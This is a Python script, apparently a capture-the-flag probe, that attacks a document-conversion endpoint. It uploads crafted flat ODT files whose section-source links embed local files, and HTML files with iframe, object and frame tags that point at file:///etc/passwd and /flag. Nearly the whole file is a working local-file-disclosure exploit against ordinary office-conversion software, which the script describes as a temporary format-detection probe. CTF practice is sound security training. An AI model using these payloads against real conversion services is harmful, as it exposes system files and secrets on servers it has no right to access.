#!/usr/bin/env python3
"""Temporary CTF flat-XML/HTML format-detection probe."""
import urllib.error
import urllib.request
import uuid

BASE = "http://njwqato3tpdz0t6k.instances.ctfcup.online"


def send(data, filename, label, fmt="txt"):
    if isinstance(data, str):
        data = data.encode()
    boundary = "----Arena" + uuid.uuid4().hex
    body = (
        f"--{boundary}\r\n"
        f'Content-Disposition: form-data; name="data"; filename="{filename}"\r\n'
        "Content-Type: application/octet-stream\r\n\r\n"
    ).encode() + data + f"\r\n--{boundary}--\r\n".encode()
    req = urllib.request.Request(BASE + "/cool/convert-to/" + fmt, data=body, method="POST")
    req.add_header("Content-Type", "multipart/form-data; boundary=" + boundary)
    print("\n===", label, repr(filename), flush=True)
    try:
        with urllib.request.urlopen(req, timeout=90) as r:
            raw = r.read(500000)
            print("STATUS", r.status, "BYTES", len(raw), "RESPONSE", raw.decode("utf-8", "replace"), flush=True)
    except urllib.error.HTTPError as e:
        print("HTTP_ERROR", e.code, e.read(200000).decode("utf-8", "replace"), flush=True)
    except Exception as e:
        print("ERROR", repr(e), flush=True)


def fodt(target):
    return f'''<?xml version="1.0" encoding="UTF-8"?>
<office:document xmlns:office="urn:oasis:names:tc:opendocument:xmlns:office:1.0" xmlns:text="urn:oasis:names:tc:opendocument:xmlns:text:1.0" xmlns:xlink="http://www.w3.org/1999/xlink" office:version="1.2" office:mimetype="application/vnd.oasis.opendocument.text">
<office:body><office:text><text:p>ARENA_MARKER</text:p><text:section text:name="s"><text:section-source xlink:href="file://{target}" xlink:type="simple" xlink:show="embed" xlink:actuate="onLoad"/></text:section></office:text></office:body></office:document>'''


for filename in ("flat.fodt", "flat.txt", "flat.xml"):
    send(fodt("/etc/passwd"), filename, "FLAT_ODT")
for filename in ("html.html", "html.txt"):
    send("<!doctype html><html><body>ARENA_MARKER</body></html>", filename, "HTML_MARKER")
for tag in (
    '<iframe src="file:///etc/passwd" width="600" height="400"></iframe>',
    '<object data="file:///etc/passwd" type="text/plain" width="600" height="400"></object>',
    '<frameset><frame src="file:///etc/passwd"></frameset>',
):
    send("<!doctype html><html><body>ARENA_MARKER" + tag + "</body></html>", "include.txt", "HTML_FILE_INCLUDE")
send(fodt("/flag"), "flat.txt", "FLAT_ODT_FLAG")
send("<!doctype html><html><body><iframe src=\"file:///flag\" width=\"600\" height=\"400\"></iframe></body></html>", "include.txt", "HTML_FLAG")
